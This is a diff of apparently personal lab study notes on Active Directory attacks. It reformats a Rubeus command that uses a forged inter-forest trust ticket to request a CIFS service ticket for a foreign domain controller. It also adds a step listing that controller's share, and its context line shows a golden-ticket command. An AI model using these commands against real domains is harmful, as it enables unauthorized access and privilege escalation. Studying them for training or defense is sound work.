@@ -795,8 +795,18 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:d
 - Abuse with Rubeus
 - Using the same TGT which we forged earlier:
 
-Rubeus.exe asktgs
-/ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi
-/service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-
-dc.eurocorp.local /ptt
+```powershell
+Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
+```
+
+
+- Now we can run commands on remote systems
+
+
+```powershell
 ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+```
+
+
+
+
